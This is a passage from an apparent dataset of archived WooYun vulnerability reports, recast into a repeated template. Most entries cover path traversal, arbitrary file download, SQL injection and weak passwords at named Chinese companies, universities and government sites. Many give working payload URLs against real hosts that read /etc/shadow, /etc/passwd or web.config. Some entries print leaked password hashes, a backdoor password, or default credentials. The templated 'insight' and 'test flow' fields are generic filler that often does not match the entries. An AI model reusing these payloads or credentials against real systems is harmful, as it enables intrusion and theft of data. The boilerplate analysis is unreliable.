**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2012-06211] TOM某分站目录遍历
**厂商**: TOM在线 | **年份**: 2012 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 配置不当造成整个分站目录遍历！

**POC**: http://iwatchome.tom.com/sites/http://iwatchome.tom.com/sites/all/modules/

**绕过**: 直接利用

**修复**: 这个简单吧！
---

---
### [wooyun-2015-0162836] 某市工程造价网存在目录遍历、越权操作和弱口令漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 扬州市工程造网存在目录遍历、越权操作和弱口令漏洞

**POC**: 网站URL为：http://**.**.**.**/YZZJWeb/目录遍历：访问http://**.**.**.**:7777可实现目录遍历：越权操作：通过目录遍历进入一些页面，如：http://**.**.**.**:7777/Config/CtrlPriceFile.aspx可进行招标控制价备查要件的增删改操作：弱口令：在网站首页点击“建筑材料指导价采集分析系统”：页面没有验证码，提交不存在的用户名会提示“该帐户不存在”，提交已存在的用户名，但密码不对时会提示“用户名或密码错误”，由此可暴力遍历存在的帐户：这些用户的密码均为1（好奇怪），如：wm，wj，wf，ly等等：

**绕过**: 直接利用

**修复**: 修改网站配置，权限校验，修改弱口令，防暴力破解
---

---
### [wooyun-2015-0161952] 全国高等学校学生信息咨询与就业指导中心某平台可目录遍历且存在后门
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 从全国高等学校学生信息咨询与就业指导中心官网：**.**.**.**进入全国大学生就业公共服务立体化平台：**.**.**.**在百度爬虫后得到该平台的后台入口为：**.**.**.**使用扫描工具对该域名进行扫描发现：**.**.**.**/work和**.**.**.**/sms均可访问并且意外得到一个根目录下得后门：**.**.**.**/1.jsp目录遍历使得源码被下载查看：后门程序：在**.**.**.**/work/Catalina/localhost/_/org/apache/jsp/_1_jsp.java文件下得到后门的密码为：lcnlcn进去后可以看到，这个后门已经存在了近三年之久：

**POC**: 证毕。

**绕过**: 直接利用

**修复**: 至少先得把后门给清了吧。
---

---
### [wooyun-2015-0129939] 华润医药主站任意文件下载导致数据库泄露
**厂商**: 华润三九医药股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主站数据库可被脱http://www.999.com.cn/downpdffile.aspx?file=/../../web.config打开文件后 内容真的全

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 参数过滤咯
---

---
### [wooyun-2014-082849] 酷派多处内部系统存在未授权访问
**厂商**: yulong.com | **年份**: 2014 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://61.141.236.9/ 直接目录遍历，未授权访问其中包括一个xls表格，里面应该是酷派商店的一些统计信息还有一些酷派商店的源码？这个不是很懂其中比较重要的有几个内部监控系统泄露http://61.141.236.9/memadmin-1.0.12/memadmin/index.php?action=set.con添加本机的监控开始监控这个应该是memcache的，还有个redis的http://61.141.236.9/redisadmin50/?import&s=0价格数据库？http://61.141.236.9/phpMyAdmin/index.php?token=38ac6a0c4ad6e2c4ca6c76ad5e600669phpmyadminn 没有登入其中目录中还有一些sql文件，具体没有深入还有其他一些信息。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-036242] 同花顺某站系统文件任意下载（root权限导致shadow、passwd等文件下载）
**厂商**: 同花顺 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题站点：http://wap.hexin.cn下载shadow文件的url：http://wap.hexin.cn/dlxhtml/download.php?bid=4528&bname=%E9%80%9A%E7%94%A8%E5%8C%BA&fn=../../../../../../../../../../etc/shadow&mid=70&mname=iPad，直接可以下载，内容如下：root:$1$lwaevE8W$u.TIDGpDOH2sEMzjjqlRP.:15512:0:99999:7:::bin:*:14627:0:99999:7:::daemon:*:14627:0:99999:7:::adm:*:14627:0:99999:7:::lp:*:14627:0:99999:7:::sync:*:14627:0:99999:7:::shutdown:*:14627:0:999

**POC**: 想看什么文件自己下载

**绕过**: 直接利用

**修复**: 1、增加download的过滤；2、改权限，不能用root；
---

---
### [wooyun-2014-083453] php设计缺陷导致绕过open_basedir列举目录#1
**厂商**: PHP | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: @fd的代码里对于列目录有两个方法，一是利用DirectoryIterator类，二是利用realpath函数。前者很好用，我就不多说了。单说下后者，realpath函数在处理已存在的文件（目录）与不存在的文件（目录）时情况不同，如果文件已存在则会抛出错误:open_basedir restriction in effect. File(xxxxx) is not within the allowed path(s)，如果文件不存在则会返回false。所以我们可以通过捕捉错误handle，来判断某文件是否存在。我的方法类似。php中有一个SplFileInfo类，其中存在一个方法getRealPath，作用和realpath函数类似，是获取规范化绝对路径名的：这个函数在文件存在的时候会返回文件名，不存在的时候返回false。测试代码如下：<?phpecho '<b>open_basedir

**POC**: 我们可以用这个函数，做一个文件名暴力枚举器。这个方法在windows下特别好用。众所周知，windows下文件名有一些通配符：双引号(">") <==> 点号(".")';大于符号(">") <==> 问号("?")';小于符号("<") <==> 星号("*")';通过这些通配符，可以减少咱们枚举时99.99%的压力，只需要循环一遍a-z0-9即可基本枚举出所有文件名是他们开头的文件(当然如果头字母都相同则需要枚举一下后面的字母)。POC在测试代码中。首先D:/test/下有如下文件：执行poc，列出目录：

**绕过**: 过滤绕过

**修复**: 文件存在、不存在，只要在open_basedir外就都应该抛出错误。
---

---
### [wooyun-2012-04661] 中国某某集团某系统信息安全分析
**厂商**: 中核集团 | **年份**: 2012 | **类型**: 应用配置错误

**元思考**: 触发信号: 后台管理

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国核工业集团公司校园招聘系统信息安全分析：后台弱口令，如图：目录遍历，如图（图片文件包含应聘者的个人信息）：基本影响到集团和所有子公司以及独立部门的人事招聘，如图：到目前为止，有9351名左右的“高端”人才个人简历暴露，如图：由于一个找回密码功能的存在，可以很容获得所有人的帐号及密码，如图：水平方向分析其影响（相对普通大众在生活、工作、个人隐私方面）由于大部分使用统一密码，而目前邮箱又是个人信息安全问题暴露最严重的web应用。同时根据简历中个人的身份证号、手机、邮箱命名、个人性格爱好以及个人心理等信息分析后对密码进行排列组合，从而大量破解，更大化暴露个人信息，如图：他们的个人其他帐号大量暴露（大部分更是统一密码），如图：他们的亲朋等信息暴露，如图：他们自身的心理缺陷，可能被国内坏蛋利用（这个浙大的MM长期为学校辛勤服务，可到毕业了，投了大量简历，工作还没着落，心理开始变的焦躁起来，如是自

**POC**: 垂直方向分析其影响（相对于中核集团公司本身）而我关心的是目前被录取的24人，如图：他们最终是要流入中核集团各个部门的，我大致了解了一下，核工业是属于国防工业的。若干年后，他们可能最终成为各个重要部门的骨干，而他们的个人信息在此暴露无疑！如果有国外坏蛋，借此漏洞，长期窃取录取人的名单及个人信息，监控他们的日常网络通信或更深层次的渗透，长此以往，就能掌控整个中核集团大量人事信息，从而进行不法勾当！我想这对于大部分的商业公司信息安全方面也是通用的！CNCERT需要兼职型信息安全评估人员吗？我报酬要求不高（每一至二个月给我发放一只低档次的北京烤鸭作为活动经费型营养补贴，其中精华部分的鸭脖及一只鸭腿分给

**绕过**: 直接利用

**修复**: 有关部门必要重视一下！
---

---
### [wooyun-2016-0170064] 中国LED网任意文件下载，泄露敏感配置信息
**厂商**: 中国LED网 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-072080] 某客服服务系统任意文件下载漏洞涉及多家银行、证券、基金、政府（二）
**厂商**: CNCERT | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.漏洞参数filename    这其实是用户在客服系统上传的图片地址。读取配置文件http://x.x.x.x/uploadfile?istrade=istrade&filename=../WEB-INF/web.xml读取passwd文件http://x.x.x.x//uploadfile?istrade=istrade&filename=../../../../../etc/passwdhttp://im.dhzq.com.cn:9090/uploadfile?istrade=istrade&filename=../WEB-INF/web.xmlhttp://im.dhzq.com.cn:9090/uploadfile?istrade=istrade&filename=../../../../../etc/passwd

**POC**: 国金证券http://im.gjzq.cn:9090/国航http://60.247.100.70:9090/吉祥人寿http://ucstar.jxlife.com.cn:9090/南方基金(有waf)http://cconline.southernfund.com:9898安信证券http://119.147.80.161:8002/http://oa.hdbp.com:9090/-----------------------------------更多案例列表：http://www.qqtech.com/casefinance/index.htm

**绕过**: 直接利用

**修复**: 目录权限控制防止采用../方式回溯到上一级目录。
---

---
### [wooyun-2014-073981] 某通用型多数高校及科研机构在用期刊采编系统两处SQL注射
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前人漏洞WooYun: 多所高校和科研机构某系统任意文件下载漏洞厂商：三才科技实业有限公司 官网：http://www.samsoncn.com/产品：三才期刊采编系统典型客户：http://www.samsoncn.com/product/Customers.aspx典型客户中的部分实例：http://tis.hrbeu.edu.cnhttp://www.cjebm.org.cnhttp://xbskb.ysu.edu.cnhttp://www.j-smu.comhttp://www.hxyxqk.com.cnhttp://heuxb.hrbeu.edu.cnhttp://lkkf.njfu.edu.cnhttp://www.psytxjx.comhttp://www.xfcjwkzazhi.cnhttp://www.zgpwzz.comhttp://jee.ieecas.cnhttp:

**POC**: 0x1：第1处注入 /retrieve.aspx 取回用户名/密码处 ctl00$cphContect$tbMail参数存在注入 (Post)0x2：第2处注入 /Register.aspx 用户注册处 ctl00$cphContect$txtName参数存在注入 (Post)实例证明1：http://xuebao.ysu.edu.cn/retrieve.aspx 燕山大学学报实例证明2：http://www.xfcjwkzazhi.cn/retrieve.aspx 中国修复重建外科杂志实例证明3：http://www.hgqks.com/retrieve.aspx 中国石油天然气集团公司

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-073388] iReader数字资源远程访问管理系统任意文件读写
**厂商**: 福州恒达通电子信息技术有限公司 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试某站的时候遇上的。结果发现该cms被应用到众多高校中。危害巨大。所有服务器都是相同配置。edit.php没有做过滤，可以读取任意文件，并且写入。似乎是KindEditor的漏洞。百度 or 谷歌：iReader数字资源远程访问管理系统一搜一大片

**POC**: http://202.109.194.127/edit.php?mfile=index.php还能读取绝对路径还能写入文件可惜我测试到的网站似乎web目录都没有写权限，不然直接getshell。来一点网站吧http://59.77.20.90/edit.php?mfile=edit.phphttp://202.109.194.127/edit.php?mfile=edit.phphttp://211.68.192.32/edit.php?mfile=edit.phphttp://211.80.224.37/edit.php?mfile=edit.php

**绕过**: 直接利用

**修复**: 你们比我懂
---

---
### [wooyun-2012-05784] 电子工业出版社官网多个安全问题！
**厂商**: 电子工业出版社 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞包括跨站、csrf、任意文件下载、爆源代码、代码逻辑问题（不花钱买书）!-_-!!

**POC**: 跨站：1、反射型http://www.phei.com.cn/module/goods/searchkey.jsp?searchKey=<iframe/src=http://www.baidu.com>2、存储型去bbs发贴csrf:大家懂的，抓包分析就成！任意文件下载：http://www.phei.com.cn/download/download.jsp?filepath=/WEB-INF/web.xml爆源代码：在jsp文件后面加上.就行了，想不到这么老的漏洞都还有-_-!最严重的漏洞来了，可不花钱买书:)代码罗辑漏洞：去买书，走到确认订定处用插件修改源码只花了点快递费十元，书就成免费的

**绕过**: 直接利用

**修复**: 你们该花心思好好想想怎么补漏洞了:)
---

---
### [wooyun-2014-054147] 益阳市人民政府任意文件下载
**厂商**: 益阳市人民政府 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.yyzwfw.gov.cn/index/downLoadFile.action?filePath=index.jsp&fileName=11.txt

**POC**: www.yyzwfw.gov.cn/index/downLoadFile.action?filePath=index.jsp&fileName=11.txt

**绕过**: 直接利用

**修复**: 禁止目录跨越
---

---
### [wooyun-2015-0129370] 鹏华基金主站任意文件读取&下载漏洞
**厂商**: 鹏华基金管理有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.phfund.com.cn/Downloader?filePath=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.pdfroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-015357] 社工某大型网站设计公司客户重要信息泄露
**厂商**: ibevision先见网络传播 | **年份**: 2012 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ibevision设计公司将公司信息（招聘、微博等密码）和用户信息（后台登陆密码）以文件形式存储在某托管服务器中，google爬虫成功遍历；使用简单google社工搜索：intext:pwd OR password intext:user OR 用户名 filetyp:txt 就可以搜索到公司网站：www.ibevision.com

**POC**: http://thinklab-eyewear.com/files/Work/Others/Kevin/http%E9%93%BE%E6%8E%A5.txt文件所在位置在google中根据关键字搜索文件中部分内容，包括招聘网站信息，V微博信息等根据用户名密码可成功登陆

**绕过**: 直接利用

**修复**: 建议在服务器上将敏感信息删除，更改相关内容的密码对服务器上做规避，降权等操作，阻止目录遍历；
---

---
### [wooyun-2015-090528] 中兴某分站任意文件下载
**厂商**: 中兴通讯股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://enterprise.zte.com.cn/servlet/DownLoadFenJieServlet?fileName=/app/loadToSupport/loadToSupport.jsp&newFile=1&outFileName=1.txtfilename参数允许路径穿越，下载任意文件，示例为下载loadToSupport.jsp保存为1.txt.

**POC**: 下载文件：文件代码如下：

**绕过**: 直接利用

**修复**: 禁止路径穿越，校验下载文件后缀
---

---
### [wooyun-2016-0168697] 一嗨租车目录遍历引发的测试账号泄露及后台未授权访问
**厂商**: 一嗨租车 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 后台管理

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某台服务器上存在目录遍历：http://220.248.118.29/证明是一嗨租车的服务器：http://220.248.118.29/Booking/http://220.248.118.29/EhiApiDocument/namespaces.html后台泄露：http://220.248.118.29/PortalsAdmin/http://220.248.118.29/ChargeAccount2/Login.aspxhttp://220.248.118.29/Html/EhiShare/CMS/login.htmlhttp://220.248.118.29/chexiangOA/后台未授权访问：http://220.248.118.29/Html/EhiShare/CMS/car_information.html####http://220.248.118.29/Html/Eh

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-067666] Srun3000计费系统任意文件下载漏洞（直接获取管理密码）
**厂商**: srun.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 版本：版本 	Srun3000 [3.00rc14.17.4]使用量还是相当多的，主要为各大高校:(url不列出来了，太暴力，怕自己学校的也被爆。1.任意文件下载漏洞漏洞文件/srun3/srun/services/modules/login/controller/login_controller.php代码/*** 下载一个文件**/// 此处存在任意文件下载漏洞--fuckpublic function download(){global $file;$this->model->download_file($file);}download_file文件路径为/srun3/srun/services/modules/modules.php代码为/*** 下载一个文件** @param unknown_type $file*/public function download_file($f

**POC**: 此处下载其配置文件/srun3/etc/srun.conf如图下载/etc/passwd 如图结果然后，对srun3000的系统进行大致的说明系统默认端口为8800，对应的web路径为/srun3/srun/services/端口为8080的对应web路径为/srun3/srun/web/端口为8081的对应的web路径为/srun3/srun/system/[全是洞。。。]端口为80的对应的web路径为/srun3/web//srun3/srun/services/为学生登录查看自己的个人信息，个人上网记录等，其数据库密码加密方式为密码md5然后从第9位开始取16位，数据库表为user/sr

**绕过**: 直接利用

**修复**: 用户可控的变量太多
---

---
### [wooyun-2014-054145] 宁波政府法制信息网 任意文件下载
**厂商**: 宁波政府法制信息网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: jd.nbfz.gov.cn/adminlaw/site_backup.jsp?action=download&filename=c:/boot.ini

**POC**: jd.nbfz.gov.cn/adminlaw/site_backup.jsp?action=download&filename=c:/boot.ini

**绕过**: 直接利用

**修复**: 能不能别这么直接连盘符都带进去……
---

---
### [wooyun-2015-0119488] 苏宁某站点任意文件读取漏洞
**厂商**: 江苏苏宁易购电子商务有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞站点：http://u.suning.com漏洞说明：在读取站内消息时，链接 http://u.suning.com/member/personal/announce/ajaxDetail.htm 的参数 contentUrl 存在缺陷，可直接读取系统文件POST /member/personal/announce/ajaxDetail.htm HTTP/1.1Host: u.suning.comProxy-Connection: keep-aliveContent-Length: 58中间的部分省略吧id=1653&announceId=25&contentUrl=漏洞参数&ifRead=1

**POC**: {"viewContent":"root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0143475] 淘米部分源码及数据库泄露
**厂商**: 淘米网 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 后台管理

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 备份包：http://114.80.99.111/1.tar.gz修改器后台：http://114.80.99.111/ahero/后台x2：http://114.80.99.111/server/备份包config.php中有数据库ip账号密码

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 添加ip限制
---

---
### [wooyun-2015-094782] 卓彩网存在暴力用户密码爆破风险
**厂商**: 卓彩网 | **年份**: 2015 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登陆网址，分析发现登陆入口：http://passport.joycp.com/打开firebug插件，发现验证的逻辑很简单就是一个http get请求：http://passport.joycp.com/ajax/login.ashx?username=xxx&pwd=xxx&vcode=&jsonp=JoyCp.Login.Result&rnd=0.3753943075351882xxx部分就是传入的用户名、密码参数。java程序上：//读取用户名字典List<String> listUser = LocalFileUtils.readFile2List("u1.txt");//读取密码字典List<String> listPass = LocalFileUtils.readFile2List("p1.txt");for (String name : listUser) {for (S

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改验证逻辑。
---

---
### [wooyun-2014-060431] dtcms最新版任意文件删除漏洞
**厂商**: dtcms.net | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: tools/upload_ajax.ashxpublic void ProcessRequest(HttpContext context){switch (DTRequest.GetQueryString("action")){case "EditorFile":this.EditorFile(context);return;case "ManagerFile":this.ManagerFile(context);return;}this.UpLoadFile(context); //跟进}private void UpLoadFile(HttpContext context){string _delfile = DTRequest.GetString("DelFilePath"); //删除文件路径HttpPostedFile _upfile = context.Request.File

**POC**: 现在进行测试<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" ><head><title>upload</title></head><body><form method="post" action="http://demo.dtcms.net/tools/upload_ajax.ashx" enctype="multip

**绕过**: 直接利用

**修复**: 防止跳出目录 对任意文件进行删除
---

---
### [wooyun-2016-0167586] 国通快递存在目录遍历漏洞
**厂商**: 国通快递 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**:8084/漏洞地址

**POC**: 内部地址泄露 并且外网能够访问并且个人简历泄露了 不过名字 还是 给打上马赛克吧

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0117521] 聚美优品某站存在任意文件遍历及下载
**厂商**: 聚美优品 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 昨天看到聚美优品的任意文件下载漏洞，好吧试了下，已经有禁止了，不过没有漏洞没有补完整，这次直接任意文件下载了。http://m.jumei.com/i/MobileWap/request_delegate?url=/etc/passwd其他就不在深入了。

**POC**: 昨天看到聚美优品的任意文件下载漏洞，好吧试了下，已经有禁止了，不过没有漏洞没有补完整，这次直接任意文件下载了。http://m.jumei.com/i/MobileWap/request_delegate?url=/etc/passwd其他就不在深入，自己反思反思。

**绕过**: 直接利用

**修复**: 你们自己懂的
---

---
### [wooyun-2015-0131667] 徐州政府采购网任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在文件下载处，可看到最下面的链接，下载的文件路径

**POC**: 通过查看下载首页源码，看到数据库配置文件数据库配置信息泄露

**绕过**: 直接利用

**修复**: 过滤下载文件的路径权限
---

---
### [wooyun-2014-077062] 江南科友堡垒机信息泄露+任意文件下载漏洞(疑为后门）
**厂商**: 江南科友科技股份有限公司 | **年份**: 2014 | **类型**: 默认配置不当

**元思考**: 触发信号: 认证接口

**洞察**: 默认配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别默认配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、信息泄露（物理路径爆出来）https://1.1.1.1/audit/123baobiao.php可以通过PHP来产生EXCEL档. teaman翻译 ---------------------------- Excel Functions ---------------------------- 将下面的代码存为excel.php ,然后在页面中包括进来 然后调用 1. Call xlsBOF() 2. 将一些内容写入到xlswritenunber() 或者 xlswritelabel()中. 3.然后调用 Call xlsEOF() 也可以用 fwrite 函数直接写到服务器上，而不是用echo 仅仅在浏览器上显示。 // // To display the contents directly in a MIME compatible browser // add the foll

**POC**: https://1.1.1.1/audit/download.php?path=/usr/local/apache2/htdocs/project/www&name=/index.php

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0125130] 某敏感部门第一研究所集群管理系统存在任意文件读取漏洞
**厂商**: 公安部一所 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在《政府网站综合防护系统（网防 G01）白皮书》中看到如下地址：mask 区域*****ov1*****于是打开看看，居然拿不支持IE，只能在chrome中浏览打开8080端口出现了jstomUI在日志查看处，发现存在任意文件读取：将supervisor.log改成../../../../etc/passwd就可以读取到对应的文件了其他：在listlog.jsf?clusterName=&host=192.168.1.20变化host就可以查看20-26的服务器文件了。比如防护的日志

**POC**: 此外listlog.jsf还可以进行内部环境端口的探测，比如：listlog.jsf?clusterName=&host=192.168.1.20&port=22返回内容：listlog.jsf?clusterName=&host=192.168.1.20&port=44返回内容：

**绕过**: 直接利用

**修复**: 也不清楚这个是不是Jstorm UI的bug，网上也没有搜到实例。
---

---
### [wooyun-2013-038947] 东方信联WLAN管理系统任意文件下载漏洞
**厂商**: 东方信联 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://60.13.8.2//DownloadServlet?fileName=../../etc/shadowroot:$1$/0yuxhnC$LCKdBlu1emP7fKkrBblH2/:14560:0:99999:7:::bin:*:14560:0:99999:7:::daemon:*:14560:0:99999:7:::adm:*:14560:0:99999:7:::lp:*:14560:0:99999:7:::sync:*:14560:0:99999:7:::shutdown:*:14560:0:99999:7:::halt:*:14560:0:99999:7:::mail:*:14560:0:99999:7:::news:*:14560:0:99999:7:::uucp:*:14560:0:99999:7:::operator:*:14560:0:99999:7:::g

**POC**: http://61.168.74.105//DownloadServlet?fileName=../../etc/shadowhttps://60.13.8.2//DownloadServlet?fileName=../../etc/shadow

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-017534] 金融界某分站目录遍历文件下载数据库信息泄漏
**厂商**: 金融界 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录索引开启致任意文件下载，如 http://ad.jrj.com.cn/adservice/Web.config

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个，你们开发和运维应该有吧？
---

---
### [wooyun-2014-051430] NITC系统官方任意文件下载泄露数据库信息
